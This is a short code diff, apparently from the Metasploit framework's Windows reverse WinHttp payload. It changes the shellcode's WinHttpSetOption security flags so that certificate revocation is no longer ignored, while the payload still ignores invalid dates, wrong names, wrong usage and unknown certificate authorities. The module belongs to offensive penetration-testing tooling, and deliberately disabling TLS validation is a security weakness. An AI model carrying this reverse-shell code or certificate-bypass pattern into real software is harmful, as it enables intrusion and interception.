@@ -186,12 +186,11 @@ module Payload::Windows::ReverseWinHttp
       asm << %Q^
         ; WinHttpSetOption (hInternet, WINHTTP_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer) );
         set_security_options:
-          push 0x00003380
+          push 0x00003300
             ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
             ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
             ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
             ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
-            ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
           mov eax, esp
           push.i8 4              ; sizeof(buffer)
           push eax               ; &buffer
